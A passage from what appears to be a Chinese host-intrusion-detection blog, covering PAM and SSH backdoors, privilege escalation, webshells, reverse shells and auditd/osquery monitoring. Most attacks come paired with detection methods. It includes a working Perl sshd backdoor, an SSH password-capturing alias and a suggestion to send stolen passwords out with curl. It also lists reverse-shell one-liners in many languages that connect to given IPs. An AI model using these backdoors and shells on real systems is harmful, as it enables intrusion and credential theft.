作用：限定更改密码的长度，复杂度等等。\n   - 参数：\n     - dubug:把修改密码的行为记录到日志中 \n     - retry=N:修改密码时，允许错误的次数，默认是1次 \n     - difok=N：新密码与旧密码不同的位数。如果超过一半不同，则通过验证，则忽略difok的设置 \n     - minlen=N:密码的最短长度 \n     - dcredit=N:至少有N的数字 \n     - ucredit=N：至少有N的大写字码 \n     - lcredit=N:至少有N个小写字母 \n     - ocredit=N:至少有N个特殊字符 \n     - minclass=N:密码组成的范围(数字，大小写字母，特殊字符) \n     - maxrepeat=N:最多与上一个密码重复  \n\n5. pam_limits.so\n   - 类型：session\n   - 作用：限制资源的使用，默认的配置文件为/etc/security/limits.conf是全局的，/etc/security/limits.d/下存放各个子文件\n\n6. pam_listfile.so\n   - 类型：auth\n   - 作用：验证用户是否能够登陆\n   - 参数：\n     - item=[tty|user|rhost|ruser|group|shell]:控制的对象 \n     - sense=[allow|deny]：控制的方法 \n     - file=/path/filename:文件的路径，每个占一行 \n     - onerr=[succeed|fail]：指定某类事件发生时的返回值。  \n\n- 实例：\n\n  authrequired pam_listfile.soonerr=succeed item=user sense=deny file=/etc/ftpusers 保存在/etc/ftpusers中的用户，是不允许的。 \n\n7. pam_nologin.so\n\n   - 类型：auth\n\n   - 作用：用于拒绝除root外的不同用户的登陆(当/etc/nologin存在，或者重新制定file的情况下)\n\n   - 参数：auth\n\n     file=/path/nologin：如果文件存在，当拒绝用户登陆的时候，同时会输出该文件中保存的内容。默认文件为/etc/nologin。 \n\n8. pam_unix.so\n   - 类型：auth\n   - 作用：它会把密码与/etc/shadow中的哈希对比，对用户的进行最终认证。\n\n## 2.4 后门代码\n\n上面分析了各模块作用，我们的目标是修改pam_unix.so内的代码，加入总能通过认证并记录正确密码的后门代码。找到源码modules/pam_unix/pam_unix_auth.c::106的pam_sm_authenticate()函数，该函数内进行密码读取和验证。\n\n图中框起来的就是我们加入的后门代码，内置一个万能密码，同时在本地记录任意经过PAM认证的用户名密码对。当然此时可以用root权限做更多更隐蔽的记录，比如用curl把密码发送到远端某服务器，发送前可以对密码进行流密码加密，均可以在代码中自行实现。\n\n![img](/images/a18/2.png)\n\n## 检测\n\n监控`pam_unix.so`文件，看是否被篡改\n\n# SSH后门\n\n## 3.1 ssh软连接\n\n系统的sshd程序位于/usr/sbin/sshd，需要sshd_config中开启PAM认证（默认开启），使用ln将它软链接到别处、并且命名为/etc/pam.d/内存在的文件名，比如su、runuser，同时执行该链接（sshd服务需要root权限），指定监听端口：`ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555`。然后在其他机器上指定端口、任意可登陆用户就可以任意密码连接到受害机器。\n\n**原理：**\n\nsu通过pam进行认证，认证的时候会去到/etc/pam.d中寻找同名文件，按照文件内定义的规则进行认证，如果不存在就按照该目录下sshd的规则（和正常默认情况下没区别）进行认证。\n\n比如/etc/pam.d下的su、runuser内都含有下面这样的规则：\n\n![img](/images/a18/3.png)\n\n  PAM中的控制标记：\n\n![img](/images/a18/4.png)\n\n`/etc/pam.d/sshd`的pam认证使用了`required`，即要通过多个模块的验证才能完成登录。而su第一条规则就使用了`sufficient`，意味着只要满足`pam_rootok.so`的认证就可以登录。**这个认证模块是认证你的UID是否为0，然后立即返回认证结果。**\n\n由于/tmp/su要打开端口本来就需要root用户运行，所以这里得到的就是`uid=0`。于是`pam_rootok.so`的认证总会通过，和用户名、密码都无关。\n\n### 检测\n\n1. 检查/etc/pam.d下的异常创建、写入\n\n2. 检查系统新开放的端口\n\n3. 检查系统新进程的文件类型、位置是否正确\n\n## 3.2 SSH配置后门 \n\nssh认证流程规则写在`/etc/pam.d/sshd`中，具体语法和规则参考上一章节。根据这个规则，我们只需要把第一个auth后边的`required`改为`sufficient`就能使得PAM仅通过第一个认证后就跳过后续认证返回ssh登录成功的结果。\n\n![img](/images/a18/5.png)\n\n### 检测\n\n监控`/etc/pam.d/sshd`配置文件，看是否有变动\n\n## 3.3 ssh命令后门\n\n`alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh'`\n\n设置别名，一般最好设置在`.bashrc`，才能让管理员登录该普通用户时命令立刻生效。  \n\n### 检测\n\n检测`bashrc`和`profile`等文件是否设置了ssh别名。\n\n## 3.4 ssh wrapper后门\n\n这种后门实际是利用openssh的fork机制、重复执行后门脚本，在ssh认证之前反弹shell，不需要额外开启端口，也不会影响正常ssh登录用户。下面的脚本以perl为例，当然也可以使用python、shell等能实现同等功能的脚本进行替换。\n\n先cp /bin/sh /bin/sshd增加隐蔽性，把原本的/usr/sbin/sshd移动到/usr/bin/sshd。后门脚本放置在/usr/sbin/sshd并设置对应的权限，然后重启sshd服务，脚本内容如下：\n\n```perl\n#!/usr/bin/perl\nexec\"/bin/sshd\"if(getpeername(STDIN)=~/^..zf/); exec{\"/usr/bin/sshd\"}\"/usr/sbin/sshd\",@ARGV;\n```\n\n**代码含义：**\n\n第一行， 如果当前文件句柄STDIN是一个socket，且socket的远程连接源端口是31334（网络字节序的大端表示中31334的16进制字符串为\\x00\\x00zf，正好匹配上perl正则..zf），则执行/bin/sshd，并结束当前程序运行（不会执行第二步），相当于反弹一个root shell给远程socket（因为sshd 是以root权限运行的）\n\n第二行 启动sshd (/usr/bin/sshd是真正的sshd)服务 ，凡是传递给/usr/sbin/sshd 后门脚本的参数都传递给真正的sshd。这一行保证了普通用户也可以正常使用ssh 服务，登录并不会有什么异常现象。\n\n**无需密码的原理：**\n\n这和OpenSSH 服务特性有关，OpenSSH 和其他的网络服务一样，都会fork一个子进程处理用户连接， 但是有一点和其他网络服务不一样，新fork的子进程不会直接处理用户连接，而是重新在子进程中重新运行自身，也就是`/usr/sbin/sshd `（就是OpenSSH自身二进制文件） ，所以用户的连接是被重新运行的`/usr/sbin/sshd` 实例给处理了。重新运行/usr/sbin/sshd 就会执行后门的第一行代码。从而反弹shell且无需认证。 对于新fork的子进程来说，文件句柄STDIN/STDOUT 就和当前的socket关联在一起了。\n\n### 检测\n\n监控`/usr/sbin/sshd`完整性\n\n## 3.5 openssh后门\n\nopenssh后门即重新编译ssh的源码，在原版的ssh替换成恶意的ssh。\n\nvim includes.h，插入记录登入的日志ILOG，插入记录ssh连接出去的日志OLOG，插入SECRETPW为后门密码：\n\n![img](/images/a18/6.png)\n\nvim version.h修改ssh –V查询到的版本信息字符串：\n\n![img](/images/a18/7.png)\n\n`./configure && make && make install`编译整个项目，替换`/usr/bin/ssh`和`/usr/sbin/sshd`\n\n### 检测\n\n监控`/usr/bin/ssh`和`/usr/sbin/sshd`两个文件的完整性","tags":["后门","su","pam"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-提权检测","url":"/2019/06/15/反入侵策略总结-提权检测/","content":"\n# 什么是提权\n\n利用里系统存在的漏洞，执行漏洞利用程序，从**低权限的用户获取到一个高权限的shell。**\n\n# SUID提权\n\n## 演示\n\n```c\n#include <unistd.h>\n#include <stdlib.h>\nint main(void)\n{\n    setuid(0);\n    setgid(0);\n    system(\"ps\");\n    return 0;\n}\n```\n\n## 误报排除\n\n查找suid权限\n\n`find / -perm -u=s -type f 2>/dev/null | grep -v docker`\n\n**sudo误报：**\n\n```shell\n#!/bin/bash\n\nwhile :\ndo\n    sleep 5\ndone\n```\n\n- 低权限用户运行上述脚本\n\n- 动态监控进程`watch -n 1 -d 'ps -ef | grep passwd'`\n- 观察到进程权限为root\n\n![img](/images/a15/1.png)\n\n**passwd误报：**\n\n![img](/images/a15/2.png)\n\n- 使用低权限用户修改自己账号密码\n\n- 动态监控进程`watch -n 1 -d 'ps -ef | grep passwd'`\n- 观察到进程权限为root\n\n其他含有suid的文件（包括docker文件，图中排除了），这些文件运行可能会触发误报。\n\n![img](/images/a15/3.png)\n\n## 检测\n\n**动态进程监控：**\n\n1. 监控新建的进程，如果当前进程是root权限，并且父进程是低权限用户，则执行第2步\n2. 排除白名单suid的误报，查看当前进程的子进程是否启动了shell进程\n3. shell进程的判断可通过`/proc/[pid]/exe`对应的具体文件判断\n\n**静态文件检测：**\n\n通过Inotify技术实时监控系统环境变量$PATH下可执行文件的所有者和S_ISUID、S_ISGID位的改变，主要针对通过chown、chmod等命令修改文件所有者和文件权限的行为。\n\n# 内核漏洞提权\n\n内核提权过程\n\n![img](/images/a15/4.png)\n\n## 检测\n\n1. 监控新建的进程，如果当前进程是低权限用户，而子进程的shell是高权限用户，则告警\n2. 除了上述分析的误报，实际情况中可能还存在误报情况，可结合后期运营优化规则降低误报\n\n# 进程自身提权\n\n1. 检测进程自身权限提升的行为，即：非root进程转变成了root进程。\n2. 进程将权限提升为CAP_SETUID和CAP_SETGID \n\n## 检测\n\n扫描/proc下的进程UID、PID信息，保存起来作为基线。Netlink可以通过回调实时监测所有进程的PID/UID是否有修改。如果有修改，则存在提权行为。\n\nNetlink实时监测通过commit_creds、setuid、setresuid等系统API修改uid和gid的行为。提权判断规则如下：\n\n- euid从非0提升为0\n\n- egid从非0提升为0\n\n# 进程提升capbility\n\n进程将权限提升为CAP_SETUID和CAP_SETGID\n\n## 检测\n\n主要针对通过内核模块修改进程结构体的方式提升进程的权限。通过周期性的对比proc/[pid]/status中记录的egid、euid的变化来判断进程是否被提权。proc/[pid]/status中记录了进程的基本信息，包括：pid，uid，以及CapInh，CapPrm，CapEff等信息。\n\n判断规则如下：\n\n1. cap_setuid是否从无效变成有效\n\n2. uid从非0提升为0\n\n3. euid从非0提升为0\n\n4. egid从非0提升为0\n\n5. 父进程的euid和egid非0，但子进程的euid为0。                             \n\n\n\n**参考：**\n\nhttps://blog.csdn.net/Fly_hps/article/details/80301935\n\n[https://mochazz.github.io/2018/06/09/Linux提权之SUID/#环境搭建](https://mochazz.github.io/2018/06/09/Linux提权之SUID/#环境搭建)\n\nhttps://security.tencent.com/index.php/blog/msg/21","tags":["提权","suid"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-webshell检测","url":"/2019/06/05/反入侵策略总结-webshell检测/","content":"\n# 静态规则检测\n\n通过之前的`inotity`机制监控web目录下文件的变动，可以通过以下几种维度进行恶意判断\n\n| 检测点   | 基于业务特点       | 正常                                     | 异常                             |\n| -------- | ------------------ | ---------------------------------------- | -------------------------------- |\n| 文件属主 | 统一的发布时间     | 属主为发布系统启动账户                   | 属主为webserver进程账户          |\n| 生成时间 | 工作时间           | 工作时间内生成                           | 非工作时间生成                   |\n| 生成时间 | 同目录文件统一生成 | 大概率与同目录内其他文件在连续时间内生成 | 与同目录其他文件生成时间相差甚远 |\n| inode    | 同目录文件统一生成 | 同目录下文件inode连续分布                | 与同目录其他文件inode相差甚远    |\n| 目录     | 上层目录不保存CGI  | CGI文件位于Web用户不可写目录             | 位于上传文件夹                   |\n\n静态规则就时使用正则去匹配， 参考笔者的 https://github.com/he1m4n6a/findWebshell\n\n# 反弹shell检测 \n\n黑客获取webshell一般都是为了执行系统命令，一般会先反弹一个shell。检测规则：\n\n1. 通过netlink监控新建的进程\n\n2. 如果新bash进程属主是www-data（nginx进程权限属主），则存在被入侵风险\n\n   ![](/images/a14/1.png)\n\n   ![](/images/a14/2.png)\n   \n   ![](/images/a14/3.png)\n\n# 命令执行检测\n\n反弹shell必定伴随着命令执行，内核监控exec等调用，查看执行命令的父进程是不是nginx等web进程，如果www-data的bash进程执行了系统命令则存在被入侵的情况。\n\n![](/images/a14/4.png)\n\n# 机器学习检测\n\n参考 https://zhuanlan.zhihu.com/p/58676764 \n\n1. 计算文件的熵值\n\n   正常文件的熵主要分布在4-6之间，形如正态分布，峰值在5左右，而webshell的分布更多的位于5-6之间。 \n\n2. 命令执行类函数\n\n   统计` assert() eval() system() cmd_shell() shell_exec() `出现的次数。\n\n   依照这个思想，我们还可以选区常见的：\n\n   （1）文件，目录操作类函数\n\n   （2）解码编码类函数\n\n   （3）文件压缩类函数\n\n   （4）字符编码转换类函数\n\n   （5）字符替换类函数\n\n   （6）动态函数类等其他敏感不常见操作\n\n3.  最长的单词长度 \n\n    这个主要是针对进行编码加密的文件，他可能把符合php愈发的文件加密的乱七八糟 \n\n# 其他检测\n\n其他的检测，不是集成在HIDS中。方法有：\n\n1. **流量检测：**通过检测流量中的特征，比如中国菜刀进行webshell通信时候就有特征码。\n2. **RASP检测：**无论你的代码怎么混淆，最终底层解析还是一样的，RASP就可以在底层hook，获取混淆前的代码，在用之前的静态规则进行检测。\n\n**总结：**\n\nHIDS上不是只使用一种规则进行检测，都是多种规则和方法相互补充，类似于纵深防御的概念。因为一种方法总是有疏漏点，而多种方法相结合的方式可以把疏漏降低到最低。\n\n\n\n**参考：**\n\nhttps://paper.seebug.org/526/#_3\n\nhttps://github.com/hi-WenR0/MLCheckWebshell \n\nhttps://zhuanlan.zhihu.com/p/58676764\n\nhttps://github.com/dennybritz/cnn-text-classification-tf/","tags":["inotify","webshell","机器学习"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-反弹shell监控","url":"/2019/05/25/反入侵策略总结-反弹shell监控/","content":"\n# 重定向指令\n\nlinux文件描述符可以理解为**linux跟踪打开文件而分配的一个数字句柄**，这个数字本质上是一个文件句柄，通过句柄就可以实现文件的读写操作。\n\n当Linux启动的时候会默认打开三个文件描述符，分别是：\n\n- 标准输入：standard input 0 （默认设备键盘）\n- 标准输出：standard output 1（默认设备显示器）\n- 错误输出：error output 2（默认设备显示器）\n\n![img](/images/a13/1.png)\n\n进程启动后再打开新的文件，描述符会自动依次增加。每一个新进程都会继承其父进程的文件描述符，因此所有的shell命令（本质上也是启动新进程），都会默认有三个文件描述符。\n\n**Linux一切皆文件**，键盘、显示器设备也是文件，因此他们的输入输出也是由文件描述符控制。如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。\n\n##  重定向分类\n\n重定向主要分为两种\n\n- 输入重定向\n  - “<”\n  - “<<”\n- 输出重定向\n  - “>”\n  - “>>”\n\nbash在执行一条指令的时候，首先会检查命令中是否存在文件描述符重定向的符号，如果存在那么**首先将文件描述符重定向（预处理）**，然后在把重定向去掉，继续执行指令。如果指令中存在多个重定向，重定向**从左向右解析**。\n\n## 输入重定向\n\n```\n[n]< word （注意[n]与<之间没有空格）\n```\n\n说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）。\n\n![img](/images/a13/2.png)\n\n解析器解析到 \"<\" 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。\n\n![img](/images/a13/3.png)\n\n## 输出重定向\n\n```\n[n]> word\n```\n\n说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出）。\n\n![img](/images/a13/4.png) \n\n上述指令将文件描述符1（标准输出）重定向到了指定文件。\n\n![img](/images/a13/5.png)\n\n## 标准输出与标准错误输出重定向\n\n下面3种形式完全等价，\n\n```\n&> word \n>& word\n> word 2>&1：将标准错误输出复制到标准输出\n```\n\n说明：将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开）。\n\n![img](/images/a13/6.png) \n\n解释：我们首先执行了一个错误的命令，可以看到错误提示被写入文件（正常情况下是会直接输出的），我们又执行了一条正确的指令，发现结果也输入到了文件，说明正确错误消息都能输出到文件。\n\n![img](/images/a13/7.png)\n\n## 文件描述符的复制\n\n```\n[n]<&[m] \nn]>&[m] \n注意：这里所有字符之间不要有空格\n```\n\n- 这两个指令都是将文件描述符 n 复制到 m ，两者的区别是\n  - [n]<&[m] ：以只读的形式打开\n  - n]>&[m] ：以写的形式打开\n- 这里的 & 目的是为了区分数字名字的文件和文件描述符，如果没有 & 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符\n\n![img](/images/a13/8.png)\n\n注意，重定向符号的顺序不能随便换，因为系统是从左到右执行。我们来分析上面指令结果出现的原理，\n\n**首先解析器解析到 2>&1**\n\n![img](/images/a13/9.png)\n\n**解析器再向后解析到 “>”** \n\n![img](/images/a13/10.png)\n\n## exec 绑定重定向\n\n```\nexec [n] <> file/[n]：以读写方式打开file指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入\nexec [n] < file/[n] \nexec [n] > file/[n]\n```\n\n使用 exec 指令，可以让重定向在接下来的会话中（多条指令）持续有效。![img](../images/a14/11.png)\n\n ![img](/images/a13/12.png)\n\n# bash反弹shell分类\n\n## bash反弹shell\n\n`bash -i >& /dev/tcp/10.107.98.24/2345 0>&1`\n\n ![img](/images/a13/13.png) \n\n## telnet反弹shell\n\n`telnet 10.107.98.24 4444 | /bin/bash | telnet 10.107.98.24 5555`\n\n ![img](/images/a13/14.png)\n\n## 管道反弹shell\n\n `rm /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.107.98.24 4444 >/tmp/f`\n\n ![img](/images/a13/15.png)\n\n## 脚本反弹shell \n\n### perl反弹shell\n\n```perl\nperl -e 'use Socket;$i=\"10.107.98.24\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n```\n\n ![img](/images/a13/16.png)\n\n### ruby反弹shell\n\n```ruby\nruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)’\n```\n\n### go反弹shell\n\n```go\necho 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.0.134:8080\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n```\n\n### php反弹shell\n\n```php\nphp –r  'exec(\"/bin/bash -i >& /dev/tcp/127.0.0.1/7777\")’\n```\n\n### lua反弹shell\n\n```lua\nlua -e \"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');\"\n```\n\n### java反弹shell\n\n```java\nr = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()\n```\n\n### python反弹shell \n\n```python\npython -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"\n```\n\n ![img](/images/a13/17.png) \n\n## nc反弹shell\n\n```shell\nnc -e /bin/sh 192.168.146.129 2333\n```\n\n## socat反弹shell\n\n```shell\n# 监听命令\nsocat file:`tty`,raw,echo=0 tcp-listen:9999\n\n# 反弹命令\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.211.55.2:9999\n```\n\n![img](/images/a13/19.png)\n\n# 无bash反弹shell\n\npython版本\n\n```python\npython -c \"exec(\\\"import socket, subprocess;s = socket.socket();s.connect(('10.107.97.119 ',4444))\\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\\\")\"\n```\n\nperl版本\n\n```perl\nperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.107.97.119:4444\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n```\n\n shell版本\n\n```shell\nawk 'BEGIN{s=\"/inet/tcp/0/10.107.97.119/4444\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'\n```\n\n# shell检测\n\n## bash反弹shell检测\n\n**检测 file descriptor 是否指向一个socket:**\n\n以`“重定向符”+\"/dev/tcp`网络通信\"Bash反弹Shell这一类最经典的反弹Shell攻击方式为例，这类反弹shell的本质可以归纳为**file descriptor的重定向到一个socket句柄**\n\n![img](/images/a13/20.png)\n\n![img](/images/a13/21.png)\n\n**检测 file descriptor 是否指向一个管道符（pipe）:**\n\n对于利用“管道符”传递指令的反弹shell攻击方式来说，这类反弹shell的本质可以归纳为**file descriptor的重定向到一个pipe句柄**\n\n![img](/images/a13/22.png)\n\n### 检测方法\n\n1. 通过上一篇文章的某种方法检测内核的进程事件\n2. 判断是否是bash进程，如果是bash进程则获取父进程的信息\n3. 获取父进程的`/proc/[pid]/fd`，判断是否有存在fd重定向到pipe或者socket情况\n4. 如果存在3情况，则告警\n\n**绕过风险：仅能通过进程执行文件名判断是否为Shell进程，上传可执行文件、拷贝Bash文件到其他路径等方法会绕过这个方法**。例如这篇[文章](https://www.cnblogs.com/LittleHann/p/4596223.html#_label8)提到的，通过将/bin/sh重命名为其他名字进行反弹shell。\n\n## 非bash反弹shell检测\n\nBash只是一个应用程序的普通应用，其内部封装了调用glibc execve的功能而已，除了bash之外，白帽子还可以基于任意的应用层技术来实现反弹shell，例如：\n\n- python/perl实现纯代码形式的反弹shell文件执行：[**文件脚本检测**](https://he1m4n6a.github.io/2019/04/09/%E5%8F%8D%E5%85%A5%E4%BE%B5%E7%AD%96%E7%95%A5%E6%80%BB%E7%BB%93-%E6%81%B6%E6%84%8F%E5%91%BD%E4%BB%A4%E6%A3%80%E6%B5%8B/)\n- python/perl实现纯代码形式的反弹shell命令行指令（fileless）：[**纯命令行fileless检测**](https://he1m4n6a.github.io/2019/04/09/%E5%8F%8D%E5%85%A5%E4%BE%B5%E7%AD%96%E7%95%A5%E6%80%BB%E7%BB%93-%E6%81%B6%E6%84%8F%E5%91%BD%E4%BB%A4%E6%A3%80%E6%B5%8B/)\n- C/C++实现纯代码形式的反弹shell：**二进制文件检测**\n\n无论怎么实现，这个进程肯定是有网络通信的事件，通过进程和socket事件关联情况，获取网络通信的协议。如果有相应的网络事件，在对进程所对应的文件进行上述情形进行安全检查。\n\n### 进程和socket事件关联\n\n[关联process和socket数据](https://blog.spoock.com/2018/12/06/osquery-source-analysis-process-open-socket/)\n\n1. 遍历`/proc`，获取所有进程的pid\n2. 通过pid，遍历`/proc/pid/fd`对应的link链接，检查是否存在`socket:[]`，存在就获取对应的inode\n3. 获取`/proc/pid/ns`中net的inode\n4. 遍历 `/proc/pid/net/`下的`icmp/tcp/udp/udplite/raw`的协议\n5. 比较第四步中的inode信息与第一步的inode信息，一致的就是我们需要获取的数据。\n\n## 网络层检测\n\n### dns&icmp反弹shell\n\n本质上说，dns和icmp是一种网络通信方式，使用任何语言都可以借助这两种网络通信方式进行反弹shell交互。\n\n但是我们知道，dns和icmp和tcp/udp不一样，它们都不是直连的网络信道，而是需要通过一个第三方进行消息中转。\n\n- **dns（udp直连模式）**\n\n  - control server将指令封装成dns包格式，通过udp53直接发送给client\n  - victim client从udp53接收到dns包后进行解析，从中提取并解码得到指令，并将执行结果封装成dns包格式，通过udp53返回给server\n\n- **dns（authoritative DNS server转发模式）**\n\n  - victim client配置好dns resolve（domain nameserver），之后将所有的执行结果和指令请求都以正常dns query的形式发送给local DNS server，随后通过dns递归查询最终会发送到攻击者控制的domain nameserver上\n  - control server从dns query中过滤出反弹shell相关的会话通信，并按照dns response的形式返回主控指令。 \n\n- **icmp**\n\n  参考https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1\n\n### 检测方法\n\n这个是NIDS范畴的内容了，主要思想是根据特征码进行检测。\n\n反弹shell的通信会话中，会包含一些`cmdline shell特征`，例如`#root....`等，可以在网络侧进行NTA实时检测。\n\n\n\n**参考：**\n\nhttps://xz.aliyun.com/t/2549\n\nhttps://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html\n\nhttps://www.cnblogs.com/shanmao/archive/2012/12/26/2834210.html\n\nhttps://xz.aliyun.com/t/6727\n\nhttps://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_5","tags":["反入侵","bash重定向","反弹shell"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-进程网络监控","url":"/2019/05/10/反入侵策略总结-进程网络监控/","content":"\n# publisher/subscriber架构\n\nosquery使用了[auditd](https://www.ibm.com/developerworks/cn/linux/l-lo-use-space-audit-tool/index.html)来获取系统调用。关于系统调用的方法优缺点后面会讲到，现在学习介绍下osquery的p/s框架，优秀的框架对我们很有借鉴意义。\n\n## auditd监控实战\n\n我们通过一个实际的例子来对`audit.log`的日志结构以及unix中的`connect`内核调用进行一个简单的说明。设置规则\n\n```shell\n# auditctl -l\nNo rules\n# auditctl -a always,exit -F arch=b64 -S connect\n# auditctl -l\n-a always,exit -F arch=b64 -S connect\n```\n\n执行`curl www.baidu.com`，查看`/var/log/audit/audit.log`日志，找到其中与`curl www.baidu.com`相关的日志记录：\n\n```shell\ntype=SYSCALL msg=audit(1544195763.393:260010): arch=c000003e syscall=42 success=no exit=-115 a0=3 a1=7ffccb794910 a2=10 a3=7ffccb7941e0 items=0 ppid=53240 pid=17096 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts5 ses=1 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=(null)\ntype=SOCKADDR msg=audit(1544195763.393:260010): saddr=0200005073EFD21B0000000000000000\ntype=PROCTITLE msg=audit(1544195763.393:260010): proctitle=6375726C007777772E62616964752E636F6D\n```\n\n此事件由三个记录组成（每个以`type=`作为开始）,共享相同的时间戳和编号(其中`1544192911.452`是时间戳，`28850`是事件编号)。每个记录包含好几对 name=value ，由空格或者逗号分开。[理解审核日志文件](https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/7/html/security_guide/sec-understanding_audit_log_files)对`audit.log`中的日志文件进行了详细地解释。[审核系统引用](https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/7/html/security_guide/app-Audit_Reference#sec-Audit_Events_Fields)对日志中的每一个`name=value`都进行了详细地说明。在本文仅仅只对其中几个关键的字段进行说明。\n\n- `type=SYSCALL`，其中`SYSCALL`就表示连接到 Kernel 的系统调用触发了这个记录，在[审核记录类型](https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/7/html/security_guide/sec-Audit_Record_Types)中记录了所有的类型。\n- `syscall=42`，表示当前的系统调用值是42，由于我们记录的`connect`内核调用，说明42就表示`connect`内核调用。[Linux系统调用列表](https://www.ibm.com/developerworks/cn/linux/kernel/syscall/part1/appendix.html)记录了所有的内核调用\n- `success=no`，表示这个系统调用是成功还是失败。在本例中是没有成功。\n- `exit=-115`,表示的是系统调用的返回值。\n- `exe=\"/usr/bin/curl\"`，记录了进程的可执行路径。\n- `saddr=0200005073EFD21B0000000000000000`，表示的是系统调用的远程地址。(因为是`connect`内核调用，那么必然会与远程服务器通信)\n- `proctitle=6375726C007777772E62616964752E636F6D`，记录的是具体的执行的命令。\n- `a0-a3`,记录了内核调用的前四个参数。\n\n由于其中的很多信息都进行了编码不便于我们理解，可以使用`ausearch`解析上面的audit的日志，由于已经知道了`event id`是`28850`,直接使用`ausearch --interpret -a 260010`解析。\n\n```shell\ntype=PROCTITLE msg=audit(12/07/2018 10:16:03.393:260010) : proctitle=curl www.baidu.com \ntype=SOCKADDR msg=audit(12/07/2018 10:16:03.393:260010) : saddr={ fam=inet laddr=115.239.210.27 lport=80 } \ntype=SYSCALL msg=audit(12/07/2018 10:16:03.393:260010) : arch=x86_64 syscall=connect success=no exit=EINPROGRESS(Operation now in progress) a0=0x3 a1=0x7ffccb794910 a2=0x10 a3=0x7ffccb7941e0 items=0 ppid=53240 pid=17096 auid=username uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts5 ses=1 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=(null)\n```\n\n其中`proctitle=curl www.baidu.com`就解析出了我们的命令；`saddr={ fam=inet laddr=115.239.210.27 lport=80 }`解析除了`wwww.baidu.com`的IP地址(当然是DNS的地址),`auid=username`显示的是哪个用户执行的命令。\n\n## osquery解析audit\n\n使用文档参考：https://s0osquery0readthedocs0io.icopy.site/en/latest/deployment/process-auditing/\n\nosquery如果想要借助于`auditd`来获取信息，就需要关闭系统的`auditd`服务，由`osquery`来接管。`osquery`接管了之后就会默认地加入三条auditd的规则。\n\n```shell\n-a always,exit -S connect-a always,exit -S bind-a always,exit -S execve\n```\n\n由于利用`auditd`获取数据的方式与之前说明的`shell_history`/`process_open_socket`方式完全不同，osquery采用了`event publisher/subscriber`的架构来处理。\n\n> An osquery event publisher is a combination of a threaded run loop and event storage abstraction. The publisher loops on some selected resource or uses operating system APIs to register callbacks. The loop or callback introspects on the event and sends it to every appropriate subscriber. An osquery event subscriber will send subscriptions to a publisher, save published data, and react to a query by returning appropriate data.\n\n大致的中文意思是：osquery的事件发布结合了进程循环和事件存储。发布者(publisher )会对某些特定的资源循环或者是对操作系统的API回调。这些循环和回调得到信息之后就会发送至订阅者(subscriber)。这些订阅者就会保存数据，对SQL语句进行相应。\n\n# 进程监控\n\n[https://he1m4n6a.github.io/2020/02/22/反入侵策略总结-内核监控方式/](https://he1m4n6a.github.io/2020/02/22/反入侵策略总结-内核监控方式/) 上篇总结了监控系统调用的几种方法，进程监控主要监控两方面：\n\n1. 新建进程\n2. 进程执行命令\n\n**新建进程用的是`fork`、`vfork`、`clone`这三个函数，我们在内核中监控三个对应的系统调用即可。**\n\n- `fork` fork创造的子进程是父进程的完整副本，复制了父亲进程的资源，包括内存的内容task_struct内容\n\n- `vfork` 